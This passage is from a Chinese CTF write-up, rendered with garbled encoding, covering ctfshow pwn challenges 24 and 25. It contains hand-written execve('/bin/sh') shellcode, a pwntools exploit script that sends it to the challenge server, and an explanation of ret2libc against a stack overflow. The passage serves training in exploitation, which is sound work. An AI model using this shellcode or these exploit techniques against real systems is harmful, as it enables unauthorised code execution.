</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">mov eax, 0xb      
</span></span></span><span class="line"><span class="cl"><span class="s1">mov ecx, 0       
</span></span></span><span class="line"><span class="cl"><span class="s1">mov edx, 0       
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x0068732f  
</span></span></span><span class="line"><span class="cl"><span class="s1">push 0x6e69622f   
</span></span></span><span class="line"><span class="cl"><span class="s1">mov ebx, esp    
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80         
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span> <span class="c1"># ç”Ÿæˆä¸€ä¸ª Shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="c1"># å°†ç”Ÿæˆçš„ Shellcode å‘é€åˆ°ç›®æ ‡</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ›å»ºä¸€ä¸ªpythonæ–‡ä»¶ï¼Œè¾“å…¥è¿™äº›ä»£ç æ”¾åˆ°ç»ˆç«¯ä¸Šè¿è¡Œï¼Œè®°å¾—æå‰æ‰“å¼€å¦å¤–ä¸€ä¸ªçª—å£è¿›è¡Œncè¿æ¥è¿œç¨‹é¶æœºã€‚</p>
<p>ä¸Šé¢å…¶å®ƒçš„pythonä»£ç æ²¡å•¥å¯è®²çš„ï¼Œè¿™æ˜¯è¿œç¨‹äº¤äº’çš„æ¨¡æ¿ä»£ç ï¼Œç›´æ¥å¥—å°±å¥½ï¼Œæˆ‘ç°åœ¨é‡åœ¨è®²è§£è¿™ä¸ªæ‰‹æ“çš„shellcodeï¼Œå®ƒå’Œshellcraftæ¨¡å—äº§ç”Ÿçš„shellcodeæ•ˆæœä¸€æ ·çš„ï¼Œè€Œä¸”è¿˜å¥½çœ‹æ‡‚ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>      <span class="c1">; syscallå·ï¼š11å¯¹åº”execve</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>        <span class="c1">; argvå‚æ•°ä¸ºNULL</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>        <span class="c1">; envpå‚æ•°ä¸ºNULL</span>
</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mh">0x0068732f</span>   <span class="c1">; å‹æ ˆå­—ç¬¦ä¸²&#34;/sh\0&#34;ï¼ˆå°ç«¯åºå­˜å‚¨ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="nf">push</span> <span class="mh">0x6e69622f</span>   <span class="c1">; å‹æ ˆå­—ç¬¦ä¸²&#34;/bin&#34;ï¼ˆå°ç«¯åºå­˜å‚¨ï¼‰</span>
</span></span><span class="line"><span class="cl">    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>      <span class="c1">; ebxæŒ‡å‘æ ˆé¡¶çš„&#34;/bin/sh&#34;å­—ç¬¦ä¸²åœ°å€</span>
</span></span><span class="line"><span class="cl">    <span class="nf">int</span> <span class="mh">0x80</span>          <span class="c1">; è§¦å‘ç³»ç»Ÿè°ƒç”¨</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote class="alert alert-note">
    <blockquote>
<p>è¿™ 7 è¡Œä»£ç é€šè¿‡ç²¾å‡†è®¾ç½®å¯„å­˜å™¨å’Œæ ˆæ•°æ®ï¼Œå®Œæˆäº†<code>execve</code>ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°å‡†å¤‡ï¼Œæœ€ç»ˆå®ç° â€œç”¨<code>/bin/sh</code>æ›¿æ¢å½“å‰è¿›ç¨‹â€ çš„æ•ˆæœï¼Œæ˜¯ CTF ä¸­è·å– shell çš„åŸºç¡€æ‰‹æ®µï¼Œé€»è¾‘æ¸…æ™°ä¸”ç²¾ç®€ï¼ˆä»… 23 å­—èŠ‚ï¼‰ã€‚</p></blockquote></blockquote>
<h4 id="é€è¡Œè§£ææ‰‹æ•²shellcode">é€è¡Œè§£ææ‰‹æ•²shellcode
</h4><p>æ€è·¯ï¼šæ³¨å…¥ä¸€æ®µèƒ½æ‰§è¡Œ/bin/shçš„æ±‡ç¼–è¯­è¨€ä»£ç </p>
<p>â‘  <code>mov eax, 0xb</code></p>
<ul>
<li><code>eax</code>å¯„å­˜å™¨åœ¨ 32 ä½ Linux ç³»ç»Ÿè°ƒç”¨ä¸­ä¸“é—¨ç”¨äºä¼ é€’ â€œç³»ç»Ÿè°ƒç”¨å·â€ï¼ˆå‘Šè¯‰å†…æ ¸è¦æ‰§è¡Œå“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚</li>
<li><code>0xb</code>æ˜¯åå…­è¿›åˆ¶ï¼Œè½¬æ¢ä¸ºåè¿›åˆ¶æ˜¯<code>11</code>ï¼Œè€Œ<code>11</code>æ­£æ˜¯<code>execve</code>ç³»ç»Ÿè°ƒç”¨å¯¹åº”çš„ç¼–å·ï¼ˆå†…æ ¸é€šè¿‡è¿™ä¸ªå€¼è¯†åˆ«è¦æ‰§è¡Œ<code>execve</code>ï¼‰ã€‚</li>
</ul>
<p>â‘¡ <code>mov ecx, 0</code></p>
<ul>
<li><code>ecx</code>å¯„å­˜å™¨ç”¨äºä¼ é€’<code>execve</code>çš„ç¬¬äºŒä¸ªå‚æ•°<code>argv</code>ï¼ˆå‚æ•°åˆ—è¡¨ï¼‰ã€‚</li>
<li>ä¼ <code>0</code>ï¼ˆå³<code>NULL</code>ï¼‰è¡¨ç¤º â€œæ²¡æœ‰å‚æ•°â€ï¼Œç­‰ä»·äºåœ¨å‘½ä»¤è¡Œç›´æ¥è¾“å…¥<code>/bin/sh</code>ï¼ˆä¸å¸¦ä»»ä½•å‚æ•°ï¼‰ã€‚</li>
</ul>
<p>â‘¢ <code>mov edx, 0</code></p>
<ul>
<li><code>edx</code>å¯„å­˜å™¨ç”¨äºä¼ é€’<code>execve</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•°<code>envp</code>ï¼ˆç¯å¢ƒå˜é‡åˆ—è¡¨ï¼‰ã€‚</li>
<li>ä¼ <code>0</code>ï¼ˆå³<code>NULL</code>ï¼‰è¡¨ç¤º â€œæ²¡æœ‰ç¯å¢ƒå˜é‡â€ï¼Œå†…æ ¸ä¼šä½¿ç”¨é»˜è®¤ç¯å¢ƒå˜é‡ã€‚</li>
</ul>
<p>â‘£ <code>push 0x0068732f</code></p>
<ul>
<li>
<p><code>push</code>æŒ‡ä»¤å°†æ•°æ®å‹å…¥æ ˆä¸­ï¼ˆæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„å†…å­˜åŒºåŸŸï¼‰ã€‚</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x0068732f</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ˜¯åå…­è¿›åˆ¶çš„ â€œå°ç«¯åºâ€ å­˜å‚¨ï¼ˆx86 æ¶æ„é»˜è®¤å°ç«¯åºï¼Œå³ä½åœ°å€å­˜ä½ä½å­—èŠ‚ï¼‰ï¼Œè½¬æ¢ä¸º ASCII ç ï¼š</p>
<ul>
<li><code>0x2f</code> â†’ <code>/</code></li>
<li><code>0x73</code> â†’ <code>s</code></li>
<li><code>0x68</code> â†’ <code>h</code></li>
<li><code>0x00</code> â†’ å­—ç¬¦ä¸²ç»“æŸç¬¦<code>\0</code>
æ‰€ä»¥è¿™è¡Œå®é™…æ˜¯å¾€æ ˆä¸Šå‹å…¥å­—ç¬¦ä¸²<code>&quot;/sh\0&quot;</code>ã€‚</li>
</ul>
</li>
</ul>
<p>â‘¤ <code>push 0x6e69622f</code></p>
<ul>
<li>
<p>åŒæ ·æ˜¯å‹æ ˆæ“ä½œï¼Œ<code>0x6e69622f</code>è½¬æ¢ä¸º ASCII ç ï¼š</p>
<ul>
<li><code>0x2f</code> â†’ <code>/</code></li>
<li><code>0x62</code> â†’ <code>b</code></li>
<li><code>0x69</code> â†’ <code>i</code></li>
<li><code>0x6e</code> â†’ <code>n</code>
æ‰€ä»¥è¿™è¡Œå¾€æ ˆä¸Šå‹å…¥å­—ç¬¦ä¸²<code>&quot;/bin&quot;</code>ã€‚</li>
</ul>
<p>ç»“åˆä¸Šä¸€è¡Œï¼Œæ ˆä¸Šç°åœ¨çš„å†…å®¹æ˜¯<code>&quot;/bin/sh\0&quot;</code>ï¼ˆå› ä¸ºæ ˆå…ˆå‹å…¥<code>&quot;/bin&quot;</code>ï¼Œå†å‹å…¥<code>&quot;/sh\0&quot;</code>ï¼Œæ ˆé¡¶åˆ°æ ˆåº•çš„é¡ºåºå°±æ˜¯<code>/b/i/n//s/h/\0</code>ï¼‰ã€‚</p>
</li>
</ul>
<p>â‘¥ <code>mov ebx, esp</code></p>
<ul>
<li><code>esp</code>æ˜¯æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ°¸è¿œæŒ‡å‘å½“å‰æ ˆé¡¶çš„åœ°å€ã€‚</li>
<li>ç»è¿‡ä¸¤æ¬¡<code>push</code>åï¼Œæ ˆé¡¶æ­£å¥½æ˜¯<code>&quot;/bin/sh\0&quot;</code>å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼ˆç¬¬ä¸€ä¸ªå­—ç¬¦<code>'/'</code>çš„ä½ç½®ï¼‰ã€‚</li>
<li>è¿™è¡ŒæŒ‡ä»¤å°†æ ˆé¡¶åœ°å€å­˜å…¥<code>ebx</code>ï¼Œè€Œ<code>ebx</code>å¯„å­˜å™¨åœ¨<code>execve</code>ç³»ç»Ÿè°ƒç”¨ä¸­ç”¨äºä¼ é€’ç¬¬ä¸€ä¸ªå‚æ•°<code>filename</code>ï¼ˆç¨‹åºè·¯å¾„ï¼‰ï¼Œæ‰€ä»¥<code>ebx</code>ç°åœ¨æŒ‡å‘æˆ‘ä»¬è¦æ‰§è¡Œçš„<code>&quot;/bin/sh&quot;</code>ã€‚</li>
</ul>
<p>â‘¦ <code>int 0x80</code></p>
<ul>
<li><code>int</code>æ˜¯ä¸­æ–­æŒ‡ä»¤ï¼Œ<code>0x80</code>æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨çš„ä¸­æ–­å·ã€‚</li>
<li>æ‰§è¡Œè¿™æ¡æŒ‡ä»¤ä¼šè§¦å‘ä¸€ä¸ªè½¯ä¸­æ–­ï¼Œè®© CPU ä»ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ï¼Œå†…æ ¸ä¼šæ ¹æ®<code>eax</code>ä¸­çš„ç³»ç»Ÿè°ƒç”¨å·ï¼ˆ<code>11</code>ï¼‰æ‰§è¡Œ<code>execve</code>ï¼Œå¹¶ä½¿ç”¨<code>ebx</code>ã€<code>ecx</code>ã€<code>edx</code>ä¸­çš„å‚æ•°ã€‚</li>
</ul>
<p>æ€»ä¹‹ï¼šå¿…é¡»è¦å®šä¹‰å¥½è¿™å‡ ä¸ªå¯„å­˜å™¨ï¼Œåœ¨æœ€åº•å±‚æ“ä½œç³»ç»Ÿè¿è¡Œæ—¶éƒ½ä¼šç”¨åˆ°çš„ï¼Œè¿™é‡Œä¸è¯¦ç»†è®²è¿°ï¼Œåæ­£ä½ çŸ¥é“è¿™å‡ ä¸ªå¯„å­˜å™¨ä¸€å¼€å§‹å°±å¾—è¿™ä¹ˆå®šä¹‰å°±å¥½å•¦ã€‚ï¼ˆä¸è€çƒ¦äº†ï¼‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mh">0xb</span>      
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>       
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mi">0</span>        
</span></span></code></pre></td></tr></table>
</div>
</div><p>pushå‹æ ˆæ—¶è¦è®°å¾—å­—èŠ‚é™åˆ¶ï¼Œå› ä¸ºæ¶æ„æ˜¯x32ï¼Œæ‰€ä»¥pushæœ€å¤š4ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯pushä¸¤ä¸ªï¼š/binã€/shçš„åœ°å€ï¼ˆä¸æ»¡å››ä¸ªå­—èŠ‚å¦‚/shè¦è®°å¾—ç”¨00å¡«æ»¡å“¦ä¸ç„¶ä¼šæŠ¥é”™ï¼‰</p>
<p>ç„¶åå°±æ˜¯è®°å¾—espå¯„å­˜å™¨æ˜¯åŠ¨æ€çš„&hellip;</p>
<p>è¿™æ˜¯è°ƒç”¨pwntoolsçš„shellcraftæ¨¡å—çš„expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>  <span class="c1"># è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œä¼šè¾“å‡ºè¯¦ç»†çš„äº¤äº’è¿‡ç¨‹</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)  # æœ¬åœ°è°ƒè¯•æ—¶å¯ç”¨ï¼Œç”¨äºå¯åŠ¨æœ¬åœ°çš„pwnç¨‹åº</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="mi">28183</span><span class="p">)</span>  <span class="c1"># è¿æ¥è¿œç¨‹ç›®æ ‡æœåŠ¡ï¼Œåœ°å€ä¸ºpwn.challenge.ctf.showï¼Œç«¯å£28183</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>  <span class="c1"># ç”Ÿæˆä¸€ä¸ªæ‰§è¡Œ/bin/shçš„shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>  <span class="c1"># å°†shellcodeå‘é€ç»™ç›®æ ‡æœåŠ¡</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>  <span class="c1"># è¿›å…¥äº¤äº’æ¨¡å¼ï¼Œå…è®¸ç”¨æˆ·ä¸ç›®æ ‡æœåŠ¡è¿›è¡Œäº¤äº’ï¼ˆå¦‚æ‰§è¡Œå‘½ä»¤ï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™æ˜¯å®ƒçš„shellcodeï¼ˆåŸç‰ˆæœªä¿®æ”¹è¿‡ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´ä¸Šæ¥çš„ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">        /* execve<span class="o">(</span><span class="nv">path</span><span class="o">=</span><span class="s1">&#39;/bin///sh&#39;</span>, <span class="nv">argv</span><span class="o">=[</span><span class="s1">&#39;sh&#39;</span><span class="o">]</span>, <span class="nv">envp</span><span class="o">=</span>0<span class="o">)</span> */
</span></span><span class="line"><span class="cl">        /* push b<span class="s1">&#39;/bin///sh\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        push 0x68
</span></span><span class="line"><span class="cl">        push 0x732f2f2f
</span></span><span class="line"><span class="cl">        push 0x6e69622f
</span></span><span class="line"><span class="cl">        mov ebx, esp
</span></span><span class="line"><span class="cl">        /* push argument array <span class="o">[</span><span class="s1">&#39;sh\x00&#39;</span><span class="o">]</span> */
</span></span><span class="line"><span class="cl">        /* push <span class="s1">&#39;sh\x00\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        push 0x1010101
</span></span><span class="line"><span class="cl">        xor dword ptr <span class="o">[</span>esp<span class="o">]</span>, 0x1016972
</span></span><span class="line"><span class="cl">        xor ecx, ecx
</span></span><span class="line"><span class="cl">        push ecx /* null terminate */
</span></span><span class="line"><span class="cl">        push <span class="m">4</span>
</span></span><span class="line"><span class="cl">        pop ecx
</span></span><span class="line"><span class="cl">        add ecx, esp
</span></span><span class="line"><span class="cl">        push ecx /* <span class="s1">&#39;sh\x00&#39;</span> */
</span></span><span class="line"><span class="cl">        mov ecx, esp
</span></span><span class="line"><span class="cl">        xor edx, edx
</span></span><span class="line"><span class="cl">        /* call execve<span class="o">()</span> */
</span></span><span class="line"><span class="cl">        push <span class="m">11</span> /* 0xb */
</span></span><span class="line"><span class="cl">        pop eax
</span></span><span class="line"><span class="cl">        int 0x80
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/65.png"
	width="1030"
	height="560"
	srcset="/p/ctfshow-pwn-writeup/65_hu_a1098df37bfcfd3b.png 480w, /p/ctfshow-pwn-writeup/65_hu_199a30cfb9c2d5a8.png 1024w"
	loading="lazy"
	
		alt="è°ƒç”¨pwntoolsæ‰€äº§ç”Ÿçš„shellcode"
	
	
		class="gallery-image" 
		data-flex-grow="183"
		data-flex-basis="441px"
	
></p>
<p>çœ‹ç€ç¡®å®æ¯”è¾ƒä¹±&hellip;..ğŸ˜…</p>
<p>æœ€åçš„æœ€åæˆ‘æƒ³å¯¹è¿™é¢˜åšäº›è¯„ä»·ï¼Œå…¶å®é¢˜ä¸éš¾ä¸»è¦æ˜¯æˆ‘åˆæ¬¡åšï¼Œè®²å¾—æ¯”è¾ƒå•°å—¦ï¼Œå¦‚æœä½ ä¼šæ‰‹æ•²shellcodeæˆ–è€…è°ƒç”¨pwntoolsçš„shellcraftæ¨¡å—çš„è¯è¿˜æ˜¯å¾ˆç®€å•ç§’æ‰çš„ã€‚åªèƒ½æ€ªå°ç”Ÿå¤ªcaiäº†ğŸ˜„</p>
<p><img src="/p/ctfshow-pwn-writeup/67.png"
	width="856"
	height="304"
	srcset="/p/ctfshow-pwn-writeup/67_hu_12ec48f01ef5c991.png 480w, /p/ctfshow-pwn-writeup/67_hu_825f43a0aef1cbbe.png 1024w"
	loading="lazy"
	
		alt="é¡ºåˆ©å®Œæˆexecveç³»ç»Ÿè°ƒç”¨ï¼Œå¾—ä»¥è¿›è¡Œäº¤äº’"
	
	
		class="gallery-image" 
		data-flex-grow="281"
		data-flex-basis="675px"
	
></p>
<p>å¤§è‡´æ€è·¯çŸ¥é“å°±å¥½ï¼Œé¶æœºçš„flagæ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚</p>
<h3 id="pwn_025å¾…å®š">PWN_025ï¼ˆå¾…å®šï¼‰
</h3><p>é¢˜ç›®ï¼šå¼€å¯NXä¿æŠ¤ï¼Œæˆ–è®¸å¯ä»¥è¯•è¯•ret2libc</p>
<p><a class="link" href="PWN_025" >PWN_025</a></p>
<p>æ ¹æ®é¢˜ç›®ï¼Œä¹Ÿå°±æ˜¯è¯´å…·ä½“æ”»å‡»æ‰‹æ³•ä¸ºï¼š<code>ret2libc</code></p>
<p><code>ret2libc</code> æ˜¯ä¸€ç§åœ¨äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ä¸­çš„ç»å…¸æŠ€æœ¯ï¼Œå…¨ç§°ä¸º â€œreturn - to - libcâ€ï¼Œä¸­æ–‡å¯ç†è§£ä¸º â€œè¿”å›è‡³ libc åº“â€ï¼Œå¸¸ç”¨äºç»•è¿‡æ ˆä¸å¯æ‰§è¡Œï¼ˆ<code>NX</code>ï¼ŒNo - eXecuteï¼‰ä¿æŠ¤æœºåˆ¶ã€‚</p>
<blockquote>
<h4 id="ret2libcå®ç°æ­¥éª¤">ret2libcå®ç°æ­¥éª¤
</h4><ol>
<li><strong>ä¿¡æ¯æ³„æ¼</strong>ï¼šé€šè¿‡æ ˆæº¢å‡ºæ¼æ´ï¼Œç»“åˆä¸€äº›å‡½æ•°ï¼ˆå¦‚ <code>write</code> å‡½æ•°ï¼‰ï¼Œæ³„æ¼å‡ºç¨‹åºä¸­ <code>libc</code> åº“å‡½æ•°çš„çœŸå®åœ°å€ã€‚å› ä¸ºåœ¨ä¸åŒç³»ç»Ÿä¸­ï¼Œ<code>libc</code> åº“åŠ è½½çš„åŸºåœ°å€æ˜¯éšæœºçš„ï¼ˆ<code>ASLR</code> ä¿æŠ¤æœºåˆ¶ï¼‰ï¼Œä½†åº“å†…å‡½æ•°ä¹‹é—´çš„ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥éœ€è¦å…ˆè·å–ä¸€ä¸ªå·²çŸ¥å‡½æ•°ï¼ˆæ¯”å¦‚ <code>write</code> ï¼‰çš„çœŸå®åœ°å€ï¼Œè¿›è€Œè®¡ç®—å‡ºå…¶ä»–å‡½æ•°ï¼ˆå¦‚ <code>system</code> ï¼‰çš„åœ°å€ã€‚</li>
<li><strong>è®¡ç®—å…³é”®åœ°å€</strong>ï¼šæ ¹æ®æ³„æ¼å‡ºçš„ <code>libc</code> å‡½æ•°åœ°å€ï¼Œè®¡ç®—å‡º <code>system</code> å‡½æ•°åœ°å€å’Œ <code>/bin/sh</code> å­—ç¬¦ä¸²åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ç”±äº <code>libc</code> ä¸­å‡½æ•°å’Œå­—ç¬¦ä¸²çš„ç›¸å¯¹ä½ç½®å›ºå®šï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å·²çŸ¥å‡½æ•°åœ°å€ä¸åç§»é‡æ¥è®¡ç®—å…¶ä»–å…³é”®åœ°å€ã€‚</li>
<li><strong>æ„é€  payload</strong>ï¼šå†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ï¼Œæ„é€ åˆé€‚çš„ payloadã€‚payload ä¸€èˆ¬åŒ…å«å¡«å……æ•°æ®ï¼ˆç”¨äºå¡«æ»¡ç¼“å†²åŒºç›´åˆ°è¦†ç›–è¿”å›åœ°å€ï¼‰ã€<code>system</code> å‡½æ•°åœ°å€ï¼ˆè¦†ç›–è¿”å›åœ°å€ï¼Œä½¿ç¨‹åºè¿”å›æ—¶è·³è½¬åˆ° <code>system</code> å‡½æ•°ï¼‰ã€ä¸€ä¸ªæ— æ•ˆçš„è¿”å›åœ°å€ï¼ˆ<code>system</code> å‡½æ•°æ‰§è¡Œå®Œåè¦è¿”å›çš„åœ°å€ï¼Œéšä¾¿å¡«å……ä¸€ä¸ªåœ°å€ï¼Œå› ä¸ºè·å–åˆ° shell åé€šå¸¸ä¸ä¼šå†å…³æ³¨è¿™ä¸ªè¿”å›æ“ä½œ ï¼‰ã€<code>/bin/sh</code> å­—ç¬¦ä¸²çš„åœ°å€ï¼ˆä½œä¸º <code>system</code> å‡½æ•°çš„å‚æ•°ï¼Œè¿™æ · <code>system</code> å‡½æ•°æ‰§è¡Œæ—¶å°±ç›¸å½“äºæ‰§è¡Œäº† <code>system(&quot;/bin/sh&quot;)</code> ï¼Œä»è€Œæ‰“å¼€ä¸€ä¸ª shell ï¼‰ã€‚</li>
<li><strong>å‘é€ payload</strong>ï¼šå°†æ„é€ å¥½çš„ payload å‘é€ç»™å­˜åœ¨æ¼æ´çš„ç¨‹åºï¼Œä½¿ç¨‹åºæŒ‰ç…§æ”»å‡»è€…æœŸæœ›çš„æµç¨‹æ‰§è¡Œï¼Œæœ€ç»ˆè·å–åˆ°ä¸€ä¸ªäº¤äº’å¼ shellï¼Œè¾¾åˆ°æ¼æ´åˆ©ç”¨çš„ç›®çš„ã€‚</li>
</ol></blockquote>
<p>checksecä¸€ä¸‹ï¼Œå‘ç°å¼€äº†MXä¿æŠ¤ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½ç”¨shellcodeäº†ã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/68.png"
	width="746"
	height="164"
	srcset="/p/ctfshow-pwn-writeup/68_hu_a99ea644fc591014.png 480w, /p/ctfshow-pwn-writeup/68_hu_74f646b65d73e4a1.png 1024w"
	loading="lazy"
	
		alt="x32"
	
	
		class="gallery-image" 
		data-flex-grow="454"
		data-flex-basis="1091px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/86.png"
	width="716"
	height="251"
	srcset="/p/ctfshow-pwn-writeup/86_hu_ad09145c80ebcfc7.png 480w, /p/ctfshow-pwn-writeup/86_hu_102f231e16202428.png 1024w"
	loading="lazy"
	
		alt="F5åç¼–è¯‘æŸ¥çœ‹mainä»£ç "
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="684px"
	
></p>
<p><img src="/p/ctfshow-pwn-writeup/87.png"
	width="670"
	height="225"
	srcset="/p/ctfshow-pwn-writeup/87_hu_4b1328521ea80b77.png 480w, /p/ctfshow-pwn-writeup/87_hu_6142d0f1d51ae79b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="297"
		data-flex-basis="714px"
	
></p>
<p>å¯ä»¥å‘ç°bufå¤§å°ä¸º 132 å­—èŠ‚ï¼Œä½†readå…è®¸è¯»å– 0x100ï¼ˆ256ï¼‰å­—èŠ‚å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚</p>
<p>IDAx32åˆ†æï¼Œä¹Ÿæ²¡æœ‰/bin/shã€åé—¨systemï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/69.png"
	width="1324"
	height="545"
	srcset="/p/ctfshow-pwn-writeup/69_hu_6b3b5c81b042741f.png 480w, /p/ctfshow-pwn-writeup/69_hu_60765907f2428b45.png 1024w"
	loading="lazy"
	
		alt="æ— /bin/shè·¯å¾„"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="583px"
	
></p>
<p>è¿™æ—¶å€™å°±éœ€è¦ä½¿ç”¨åˆ©ç”¨libcï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰çš„systemå‡½æ•°å’Œ/bin/shå­—ç¬¦ä¸²ï¼ˆè¿™é¢˜æ€è·¯å¾ˆç±»ä¼¼PWN_024çš„ç¼–å†™shellcodeä¸€æ ·ï¼Œç¨‹åºæœ¬èº«æ²¡æœ‰åé—¨å¯å…¥åªèƒ½ä»å¤–éƒ¨é“¾æ¥è¿›è¿™äº›å‡½æ•°ï¼Œä»è€Œè¾¾åˆ°è¿›å…¥äº¤äº’&hellip;ï¼‰ï¼Œè¿™äº›ä¸œè¥¿åœ¨ç¨‹åºè¿è¡Œæ—¶çš„çœŸå®åœ°å€è®¡ç®—æ–¹æ³•ä¸ºï¼š<code>@gotçœŸå®åœ°å€ = libcåŸºå€ + åç§»</code>ï¼Œæ‰€ä»¥è¦å…ˆè®¡ç®—å‡º<strong>åç§»</strong>ã€‚</p>
